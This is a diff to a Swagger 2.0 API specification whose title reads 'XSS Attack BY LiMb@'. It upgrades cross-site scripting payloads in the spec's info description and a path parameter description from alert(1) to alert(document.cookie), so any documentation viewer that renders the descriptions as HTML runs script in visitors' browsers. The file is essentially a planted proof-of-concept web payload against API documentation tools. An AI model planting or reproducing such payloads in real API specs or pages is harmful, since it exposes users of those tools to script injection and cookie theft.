@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY LiMb@
   description: |
-    <script>alert(1)</script>
+    <script>alert(document.cookie)</script>
 
   version: production
 basePath: /JSSResource/
@@ -21,14 +21,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - M0X0101_XSS_D
+        - XSS Attack BY LiMb@
       operationId: findAccounts
       summary: Finds all accounts
   '/accounts/groupid/{id}':
     delete:
       parameters:
         - description: |
-                <script>alert(1)</script>
+                <script>alert(document.cookie)</script>
           format: int64
           in: path
           name: id
